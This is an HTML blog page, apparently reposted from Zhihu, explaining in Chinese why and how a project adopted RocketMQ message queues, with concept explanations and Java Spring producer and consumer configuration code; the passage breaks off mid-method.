@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>RocketMQ在项目中的简单实践 - 编程随想</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="RocketMQ在项目中的简单实践" />
+<meta property="og:description" content="原文：RocketMQ在项目中的简单实践
+本文由一个特定的问题展开，讲述在项目中引入消息队列中间件的起因、过程与思路总结。
+待解决的问题 在mytalk项目中，需要设计一个添加议题接口（由标题和内容等信息组成，相当于发一个微博话题），议题创建除了需要在数据库中添加记录外，还需要执行以下步骤：
+通知议题相关的小组成员通知搜索引擎该议题上线给议题提出者增加积分未来可能增加的新的需求 更具体一些，我们希望第1，2两点的执行结果不影响议题本身的创建结果，最好也不要拖累创建议题这个基本业务的执行。也就是说，无论是通知失败还是通知过程异常，都是通知模块的事情，与议题创建接口无关，接口在逻辑上异步调用通知服务，单向通信，不必接收回调。我们希望第3点“给议题提出者增加积分”的操作的执行结果与议题创建的结果绑定，要么同时失败，要么同时成功，整体看作一个事务，不可以出现添加议题成功但是积分没有增加的情况。接口在逻辑上同步或异步完成添加积分的业务，但是在处理响应时，需要检查是否达成一致的状态，如有必要，需进行事务回滚。我们还希望未来这个接口能支持更多的功能，可以在添加议题成功或者失败时处理一些自定义业务。
+观察者模式 如果是解依赖，这让我联想到观察者模式。观察者模式的实现思路是，在发布者类中声明一个委托列表，委托是可回调的接口或方法对象，订阅者在初始化时向发布者申请注册一个回调事件，发布者将该订阅者注册到自己的委托列表中，在目标事件触发时，遍历委托列表，逐个调用委托方法，由此订阅者收到事件的回传通知，进入到自己的方法执行过程。这的确是实现了解依赖，而且订阅者在事件发生的第一时间就能做成反应，但问题是，这是基于单线程的设计模式，不适用多线程，更不用说是不同机器上的服务了。
+如果利用RPC，可以访问远程服务，观察者模式还能不能应用于服务间的解耦呢？可以用，但不能解耦。因为线程内的方法调用远远比远程服务的方法调用更可靠，只要是访问远程服务，就不可避免的需要看每个服务的脸色行事，网络延迟、计算超时、服务宕机都可能影响到发布者，因为发布者直接调用了这些远程方法。线程中的方法调用，多是同一组程序员完成的，很容易约定事件接收者的执行时间、同步异步协作方式等，因此使用观察者这种低依赖的设计模式即可，但是不同的服务可能是不同的团队甚至是不同的公司完成，暴露出的接口风格各不相同，完全不能信赖。
+这时候就需要一个中间人，接受发布者传递的消息，并推送给订阅者，不管发布者和订阅者如何实现，如何故障，只保证自己的高吞吐，高可用。这个中间人一定是值得信任的，否则就退回到观察者模式的问题中，更有甚者，可以直接认为当消息发送到了中间人手里，就代表已经完成任务了，这是“基于信任编程”，这种编程方式是零耦合的。
+​
+消息队列RocketMQ Apache RocketMQ是一种低延迟、高并发、高可用、高可靠的分布式消息中间件。消息队列RocketMQ既可为分布式应用系统提供异步解耦和削峰填谷的能力，同时也具备互联网应用所需的海量消息堆积、高吞吐、可靠重试等特性。
+消息队列核心概念：
+Topic：消息主题，一级消息类型，生产者向其发送消息。Broker：中间人/经纪人，消息队列集群的节点，负责保存和收发消息。生产者：也称为消息发布者，负责生产并发送消息至Topic。消费者：也称为消息订阅者，负责从Topic接收并消费消息。Tag：消息标签，二级消息类型，表示Topic主题下的具体消息分类。消息：生产者向Topic发送并最终传送给消费者的数据和（可选）属性的组合。消息属性：生产者可以为消息定义的属性，包含Message Key和Tag。Group：一类生产者或消费者，这类生产者或消费者通常生产或消费同一类消息，且消息发布或订阅的逻辑一致。 生产者发送消息到消息队列，最终发送到消费者的示意图如下：
+消息类型可以划分为：
+普通消息。也称并发消息，没有顺序，生产消费都是并行的，拥有极高的吞吐性能事务消息。提供了保证消息一定送达到broker的机制。分区顺序消息。Topic分为多个分区，在一个分区内遵循先入先出原则。全局顺序消息。把Topic分区数设置为1，所有消息都遵循先入先出原则。定时消息。将消息发送到MQ服务端，在消息发送时间（当前时间）之后的指定时间点进行投递延迟消息。将消息发送到MQ服务端，在消息发送时间（当前时间）之后的指定延迟时间点进行投递 消费方式可以划分为：
+集群消费。任意一条消息只需要被集群内的任意一个消费者处理即可。广播消费。将每条消息推送给集群内所有注册过的消费者，保证消息至少被每个消费者消费一次。 消费者获取消息模式可以划分为：
+Push。开启单独的线程轮询broker获取消息，回调消费者的接收方法，仿佛是broker在推消息给消费者。Pull。消费者主动从消息队列拉取消息。 为什么要分Topic，分区 topic是逻辑概念。topic表示消息的主题，是消息系统中的抽象概念，生产者可以发布多个topic。
+topic可能被大量消费者订阅，为了充分利用集群特性，topic将消息划分为多个分区（从实现角度来说是队列），再分布到多个集群节点上（broker），提供系统吞吐量。在广播消费模式中，一个队列将被所有消费者消费；在集群消费模式中，一个队列只被一个消费者线程消费，这保证了消费不会被重复消费。对于消费者端来说，可以消费多个分区的消息。
+分区更倾向于是实现层面的概念，生产者和消费者并不需要关心分区，只需要关心Topic。但也注意到，分区只能被一个消费者实例消费，如果分区的设置数量小于消费者实例数，可能造成部分消费者线程空闲。
+消费者组 消费者组是特定业务的服务集群，可以订阅一个topic，也可以订阅多个topic。官方文档上说明：消息队列 RocketMQ 的订阅关系主要由 Topic &#43; Tag 共同组成，同一个消费者 Group ID 下所有 Consumer 实例所订阅的 Topic、Tag 必须完全一致。一开始我也有些疑惑，但后来发现这与订阅多个topic并不矛盾，只是一个Consumer 实例订阅Topic_A和Topic_B，那么同一组的其他Consumer也必须订阅Topic_A和Topic_B。这个规则只要不刻意违反其实很容易遵守，因为集群的原理之一就是一份代码多处布置，代码相同自然订阅关系相同。
+订阅多个Topic的代码演示：
+@Configuration public class ConsumerClient { @Autowired private MqConfig mqConfig; @Autowired private IssueMessageListener messageListener; @Autowired private OtherMessageListener otherMessageListener; @Bean(initMethod = &#34;start&#34;, destroyMethod = &#34;shutdown&#34;) public ConsumerBean buildConsumer() { ConsumerBean consumerBean = new ConsumerBean(); Properties properties = mqConfig." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/b683371c0a7d1b4c645559bc2b7e8dba/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-03-07T15:37:10+08:00" />
+<meta property="article:modified_time" content="2021-03-07T15:37:10+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程随想" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程随想</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">RocketMQ在项目中的简单实践</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p>原文：<a href="https://zhuanlan.zhihu.com/p/344404500" rel="nofollow">RocketMQ在项目中的简单实践</a></p> 
+<p>本文由一个特定的问题展开，讲述在项目中引入消息队列中间件的起因、过程与思路总结。</p> 
+<h5><a id="_4"></a>待解决的问题</h5> 
+<p>在mytalk项目中，需要设计一个添加议题接口（由标题和内容等信息组成，相当于发一个微博话题），议题创建除了需要在数据库中添加记录外，还需要执行以下步骤：</p> 
+<ol><li>通知议题相关的小组成员</li><li>通知搜索引擎该议题上线</li><li>给议题提出者增加积分</li><li>未来可能增加的新的需求</li></ol> 
+<p>更具体一些，我们希望第1，2两点的执行结果不影响议题本身的创建结果，最好也不要拖累创建议题这个基本业务的执行。也就是说，无论是通知失败还是通知过程异常，都是通知模块的事情，与议题创建接口无关，接口在逻辑上异步调用通知服务，单向通信，不必接收回调。我们希望第3点“给议题提出者增加积分”的操作的执行结果与议题创建的结果绑定，要么同时失败，要么同时成功，整体看作一个事务，不可以出现添加议题成功但是积分没有增加的情况。接口在逻辑上同步或异步完成添加积分的业务，但是在处理响应时，需要检查是否达成一致的状态，如有必要，需进行事务回滚。我们还希望未来这个接口能支持更多的功能，可以在添加议题成功或者失败时处理一些自定义业务。</p> 
+<h5><a id="_17"></a>观察者模式</h5> 
+<p>如果是解依赖，这让我联想到观察者模式。观察者模式的实现思路是，在发布者类中声明一个委托列表，委托是可回调的接口或方法对象，订阅者在初始化时向发布者申请注册一个回调事件，发布者将该订阅者注册到自己的委托列表中，在目标事件触发时，遍历委托列表，逐个调用委托方法，由此订阅者收到事件的回传通知，进入到自己的方法执行过程。这的确是实现了解依赖，而且订阅者在事件发生的第一时间就能做成反应，但问题是，这是基于单线程的设计模式，不适用多线程，更不用说是不同机器上的服务了。</p> 
+<p>如果利用RPC，可以访问远程服务，观察者模式还能不能应用于服务间的解耦呢？可以用，但不能解耦。因为线程内的方法调用远远比远程服务的方法调用更可靠，只要是访问远程服务，就不可避免的需要看每个服务的脸色行事，网络延迟、计算超时、服务宕机都可能影响到发布者，因为发布者直接调用了这些远程方法。线程中的方法调用，多是同一组程序员完成的，很容易约定事件接收者的执行时间、同步异步协作方式等，因此使用观察者这种低依赖的设计模式即可，但是不同的服务可能是不同的团队甚至是不同的公司完成，暴露出的接口风格各不相同，完全不能信赖。</p> 
+<p>这时候就需要一个中间人，接受发布者传递的消息，并推送给订阅者，不管发布者和订阅者如何实现，如何故障，只保证自己的高吞吐，高可用。这个中间人一定是值得信任的，否则就退回到观察者模式的问题中，更有甚者，可以直接认为当消息发送到了中间人手里，就代表已经完成任务了，这是“基于信任编程”，这种编程方式是零耦合的。</p> 
+<p>​</p> 
+<h5><a id="RocketMQ_27"></a>消息队列RocketMQ</h5> 
+<blockquote> 
+ <p>Apache RocketMQ是一种低延迟、高并发、高可用、高可靠的分布式消息中间件。消息队列RocketMQ既可为分布式应用系统提供异步解耦和削峰填谷的能力，同时也具备互联网应用所需的海量消息堆积、高吞吐、可靠重试等特性。</p> 
+</blockquote> 
+<p>消息队列核心概念：</p> 
+<ul><li>Topic：消息主题，一级消息类型，生产者向其发送消息。</li><li>Broker：中间人/经纪人，消息队列集群的节点，负责保存和收发消息。</li><li>生产者：也称为消息发布者，负责生产并发送消息至Topic。</li><li>消费者：也称为消息订阅者，负责从Topic接收并消费消息。</li><li>Tag：消息标签，二级消息类型，表示Topic主题下的具体消息分类。</li><li>消息：生产者向Topic发送并最终传送给消费者的数据和（可选）属性的组合。</li><li>消息属性：生产者可以为消息定义的属性，包含Message Key和Tag。</li><li>Group：一类生产者或消费者，这类生产者或消费者通常生产或消费同一类消息，且消息发布或订阅的逻辑一致。</li></ul> 
+<p>生产者发送消息到消息队列，最终发送到消费者的示意图如下：</p> 
+<img src="https://images2.imgbox.com/e7/2b/PgXvkAtq_o.png" alt="image-20210112223820896"> 
+<p><strong>消息类型可以划分为</strong>：</p> 
+<ul><li>普通消息。也称并发消息，没有顺序，生产消费都是并行的，拥有极高的吞吐性能</li><li>事务消息。提供了保证消息一定送达到broker的机制。</li><li>分区顺序消息。Topic分为多个分区，在一个分区内遵循先入先出原则。</li><li>全局顺序消息。把Topic分区数设置为1，所有消息都遵循先入先出原则。</li><li>定时消息。将消息发送到MQ服务端，在消息发送时间（当前时间）之后的指定时间点进行投递</li><li>延迟消息。将消息发送到MQ服务端，在消息发送时间（当前时间）之后的指定延迟时间点进行投递</li></ul> 
+<p><strong>消费方式可以划分为：</strong></p> 
+<ul><li>集群消费。任意一条消息只需要被集群内的任意一个消费者处理即可。</li><li>广播消费。将每条消息推送给集群内所有注册过的消费者，保证消息至少被每个消费者消费一次。</li></ul> 
+<p><strong>消费者获取消息模式可以划分为：</strong></p> 
+<ul><li>Push。开启单独的线程轮询broker获取消息，回调消费者的接收方法，仿佛是broker在推消息给消费者。</li><li>Pull。消费者主动从消息队列拉取消息。</li></ul> 
+<h5><a id="Topic_72"></a>为什么要分Topic，分区</h5> 
+<p>topic是逻辑概念。topic表示消息的主题，是消息系统中的抽象概念，生产者可以发布多个topic。</p> 
+<p>topic可能被大量消费者订阅，为了充分利用集群特性，topic将消息划分为多个分区（从实现角度来说是队列），再分布到多个集群节点上（broker），提供系统吞吐量。在广播消费模式中，一个队列将被所有消费者消费；在集群消费模式中，一个队列只被一个消费者线程消费，这保证了消费不会被重复消费。对于消费者端来说，可以消费多个分区的消息。</p> 
+<p>分区更倾向于是实现层面的概念，生产者和消费者并不需要关心分区，只需要关心Topic。但也注意到，分区只能被一个消费者实例消费，如果分区的设置数量小于消费者实例数，可能造成部分消费者线程空闲。</p> 
+<h5><a id="_82"></a>消费者组</h5> 
+<p>消费者组是特定业务的服务集群，可以订阅一个topic，也可以订阅多个topic。官方文档上说明：消息队列 RocketMQ 的订阅关系主要由 Topic + Tag 共同组成，同一个消费者 Group ID 下所有 Consumer 实例所订阅的 Topic、Tag 必须完全一致。一开始我也有些疑惑，但后来发现这与订阅多个topic并不矛盾，只是一个Consumer 实例订阅Topic_A和Topic_B，那么同一组的其他Consumer也必须订阅Topic_A和Topic_B。这个规则只要不刻意违反其实很容易遵守，因为集群的原理之一就是一份代码多处布置，代码相同自然订阅关系相同。</p> 
+<p>订阅多个Topic的代码演示：</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@Configuration</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConsumerClient</span> <span class="token punctuation">{<!-- --></span>
+
+    <span class="token annotation punctuation">@Autowired</span>
+    <span class="token keyword">private</span> MqConfig mqConfig<span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Autowired</span>
+    <span class="token keyword">private</span> IssueMessageListener messageListener<span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Autowired</span>
+    <span class="token keyword">private</span> OtherMessageListener otherMessageListener<span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>initMethod <span class="token operator">=</span> <span class="token string">"start"</span><span class="token punctuation">,</span> destroyMethod <span class="token operator">=</span> <span class="token string">"shutdown"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> ConsumerBean <span class="token function">buildConsumer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        ConsumerBean consumerBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConsumerBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Properties properties <span class="token operator">=</span> mqConfig<span class="token punctuation">.</span><span class="token function">getMqPropertie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>PropertyKeyConst<span class="token punctuation">.</span>GROUP_ID<span class="token punctuation">,</span> mqConfig<span class="token punctuation">.</span>GROUP_ISSUE_TEAM_NOTICE_ID<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>PropertyKeyConst<span class="token punctuation">.</span>ConsumeThreadNums<span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        consumerBean<span class="token punctuation">.</span><span class="token function">setProperties</span><span class="token punctuation">(</span>properties<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Map<span class="token generics function"><span class="token punctuation">&lt;</span>Subscription<span class="token punctuation">,</span> MessageListener<span class="token punctuation">&gt;</span></span> subscriptionTable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Subscription subscription <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Subscription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscription<span class="token punctuation">.</span><span class="token function">setTopic</span><span class="token punctuation">(</span>mqConfig<span class="token punctuation">.</span>TOPIC_ISSUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscription<span class="token punctuation">.</span><span class="token function">setExpression</span><span class="token punctuation">(</span>mqConfig<span class="token punctuation">.</span>TAG_ISSUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscriptionTable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>subscription<span class="token punctuation">,</span> messageListener<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Subscription subscription2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Subscription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscription2<span class="token punctuation">.</span><span class="token function">setTopic</span><span class="token punctuation">(</span>mqConfig<span class="token punctuation">.</span>TOPIC_OTHER<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscription2<span class="token punctuation">.</span><span class="token function">setExpression</span><span class="token punctuation">(</span>mqConfig<span class="token punctuation">.</span>TAG_OTHER<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscriptionTable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>subscription2<span class="token punctuation">,</span> otherMessageListener<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        consumerBean<span class="token punctuation">.</span><span class="token function">setSubscriptionTable</span><span class="token punctuation">(</span>subscriptionTable<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> consumerBean<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<h5><a id="namesrv_128"></a>namesrv做了什么</h5> 
+<p>rocketmq没有使用zookeeper等中间件，而是自己实现了一个namesrv用于服务发现与负载均衡，那么其实现原理是什么。</p> 
+<p>先想一想，如果我来做服务发现，我会怎么做。有多个broker实例在运行，并且每个broker都至少配备了一个slave，生产者要均匀地写消息到多个broker中，以实现负载均衡。在生产者或消费者启动时，初始化配置所有broker节点路由信息（包括主从），确保客户端可以访问每一个broker节点，与之建立连接。当写操作产生时，将数据写到第i++ % brokerCount个broker节点中，这样均匀接收数据，实现了写的负载均衡。如果当前的broker操作写失败，则生产者将其纳入故障队列，要等一段时间后重新归入写目标队列，这样一来，能恢复的broker则自动恢复，不能恢复的将定期重试。当读操作产生时，也是均匀的从各个broker中读取数据，如果broker还配置了主从实例，且允许读slave，则再从master和slave中均匀选择一个进行读取。broker读故障处理方法同上。</p> 
+<p>但是这样一来，客户端就需要很繁琐的配置，并且当slave永久性停用或者有新的slave加入时，客户端很难做出反应，因此就需要使用namesrv来做服务发现和调度。如大多数服务发现中间件的设计思路一样，broker启动时向namesrv注册自己，而客户端在初始配置时，只需要配置namesrv的地址即可，运行期间的broker路由列表都是借由namesrv动态获取的，每隔一段时间同步全部的broker信息，这样能即时发现下线与上线的broker。</p> 
+<p>一个有意思的问题是，namesrv实例要有几个呢？如果只有一个，那么namesrv宕机的话生产者和消费者就无法获取最新的broker列表了，如果有多个，那么又回到最初的问题，客户端怎么知道要连接哪个namesrv服务，又由谁来做服务发现？rocketmq的实现方案是，namesrv有多个，但是每一个namesrv实例都是互不知晓、相互冗余的，broker是向所有可用的namesrv都注册一次，生产者和消费者遍历固定的namesrv列表，只要发现一个namesrv可用，即退出循环返回这个namesrv。显然，namesrv只是单纯的部署多份冗余实例。namesrv职责清晰，设计简单，负载小，几乎不可能出现故障，其服务地址可以作为稳定的参数硬编码进程序代码中。</p> 
+<h5><a id="_140"></a>使用云产品</h5> 
+<p>因为我们就一台服务器，在业务服务器上部署rocketmq没有实际意义，因此选择云产品，体验一下“基础设施上云”。</p> 
+<p>注意选择与业务服务器相同的地域，以便相互访问。</p> 
+<p>创建两个Topic，一个使用普通消息类型，名称为“Topic_Team”，如下图。一个使用事务消息，名称为“Topic_User”</p> 
+<p><img src="https://images2.imgbox.com/55/4b/rcllXeQH_o.png" alt="image-20210113204113259"></p> 
+<h5><a id="_150"></a>设计生产者</h5> 
+<p>先定义Topic与Tag相关的枚举配置</p> 
+<pre><code class="prism language-java"><span class="token comment">//Topic枚举配置</span>
+<span class="token keyword">public</span> <span class="token keyword">enum</span> TopicEnum <span class="token punctuation">{<!-- --></span>
+    <span class="token function">TOPIC_TEAM</span><span class="token punctuation">(</span><span class="token string">"Topic_team"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+    <span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> String topic<span class="token punctuation">;</span>
+
+    <span class="token function">TopicEnum</span><span class="token punctuation">(</span>String topic<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token keyword">this</span><span class="token punctuation">.</span>topic <span class="token operator">=</span> topic<span class="token punctuation">;</span><span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> String <span class="token function">getTopic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">return</span> topic<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<pre><code class="prism language-java"><span class="token comment">//Tag枚举配置</span>
+<span class="token keyword">public</span> <span class="token keyword">enum</span> TagEnum <span class="token punctuation">{<!-- --></span>
+    <span class="token function">TAG_ISSUE</span><span class="token punctuation">(</span><span class="token string">"issue"</span><span class="token punctuation">)</span>
+
+    <span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> String tag<span class="token punctuation">;</span>
+
+    <span class="token function">TagEnum</span><span class="token punctuation">(</span>String tag<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token keyword">this</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span><span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> String <span class="token function">getTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">return</span> tag<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>然后定义生产者bean，根据密钥，namesrv地址创建生产者实例：</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@Configuration</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProducerConfig</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> String ACCESS_KEY <span class="token operator">=</span> <span class="token string">"access_key"</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> String SECRET_KEY <span class="token operator">=</span> <span class="token string">"secret_key"</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> String NAMESRV_ADDR <span class="token operator">=</span> <span class="token string">"namesrv_addr"</span><span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>initMethod <span class="token operator">=</span> <span class="token string">"start"</span><span class="token punctuation">,</span> destroyMethod <span class="token operator">=</span> <span class="token string">"shutdown"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> Producer <span class="token function">buildProducer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">return</span> ONSFactory<span class="token punctuation">.</span><span class="token function">createProducer</span><span class="token punctuation">(</span><span class="token function">getMqPropertie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">private</span> Properties <span class="token function">getMqPropertie</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        Properties properties <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>PropertyKeyConst<span class="token punctuation">.</span>AccessKey<span class="token punctuation">,</span> ACCESS_KEY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>PropertyKeyConst<span class="token punctuation">.</span>SecretKey<span class="token punctuation">,</span> SECRET_KEY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>PropertyKeyConst<span class="token punctuation">.</span>NAMESRV_ADDR<span class="token punctuation">,</span> NAMESRV_ADDR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> properties<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>然后定义生产者客户端组件，由Producer组件封装而来:</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@Component</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProducerClient</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token annotation punctuation">@Autowired</span>
+    <span class="token keyword">private</span> Producer producer<span class="token punctuation">;</span>
+
+	<span class="token comment">//单向发送普通消息</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sendCommonMessage</span><span class="token punctuation">(</span>TopicEnum topic<span class="token punctuation">,</span> TagEnum tag<span class="token punctuation">,</span> String content<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+        Message message <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        message<span class="token punctuation">.</span><span class="token function">setTopic</span><span class="token punctuation">(</span>topic<span class="token punctuation">.</span><span class="token function">getTopic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        message<span class="token punctuation">.</span><span class="token function">setTag</span><span class="token punctuation">(</span>tag<span class="token punctuation">.</span><span class="token function">getTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        message<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span>content<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        producer<span class="token punctuation">.</span><span class="token function">sendOneway</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>最后设计议题创建接口，该接口当前只发送普通消息，即意图产生通知行为。</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@RestController</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IssueController</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">private</span> <span class="token keyword">final</span> Logger LOG <span class="token operator">=</span> LoggerFactory<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> IssueRepository issueRepository<span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> ProducerClient producer<span class="token punctuation">;</span>
+
+    <span class="token comment">//使用构造函数的IOC方式更推荐</span>
+    <span class="token keyword">public</span> <span class="token function">IssueController</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Autowired</span> IssueRepository issueRepository<span class="token punctuation">,</span> <span class="token annotation punctuation">@Autowired</span> ProducerClient producer<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>issueRepository <span class="token operator">=</span> issueRepository<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>producer <span class="token operator">=</span> producer<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/issue"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> String <span class="token function">makeIssue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token annotation punctuation">@Validated</span> Issue issue<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token comment">//本地业务</span>
+        <span class="token keyword">boolean</span> isSuccess <span class="token operator">=</span> issueRepository<span class="token punctuation">.</span><span class="token function">addIssue</span><span class="token punctuation">(</span>issue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>isSuccess<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+            <span class="token comment">//发送Topic普通消息</span>
